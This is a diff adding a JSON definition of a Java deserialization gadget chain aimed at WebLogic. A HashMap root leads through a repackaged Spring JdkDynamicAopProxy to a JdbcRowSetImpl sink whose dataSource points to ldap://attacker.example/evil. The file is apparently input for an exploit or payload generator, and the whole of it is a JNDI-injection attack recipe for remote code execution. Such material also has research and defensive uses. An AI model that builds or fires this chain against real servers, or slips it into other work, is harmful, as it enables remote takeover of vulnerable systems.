@@ -1,0 +1,27 @@
+{
+  "chain_type": "proxy_chain",
+  "description": "WebLogic BEA Spring AOP proxy: JdkDynamicAopProxy InvocationHandler -> method invocation",
+  "root_class": "java.util.HashMap",
+  "root_trigger": "readObject\u2192hash\u2192hashCode",
+  "links": [
+    {
+      "class": "com.bea.core.repackaged.springframework.aop.framework.JdkDynamicAopProxy",
+      "role": "bridge",
+      "field_overrides": {
+        "advised": {
+          "targetSource": {
+            "target": {"$ref": "link:1"}
+          }
+        }
+      }
+    },
+    {
+      "class": "com.sun.rowset.JdbcRowSetImpl",
+      "role": "sink",
+      "field_overrides": {
+        "dataSource": "ldap://attacker.example/evil"
+      }
+    }
+  ],
+  "sink_method": "JdbcRowSetImpl.getDatabaseMetaData"
+}
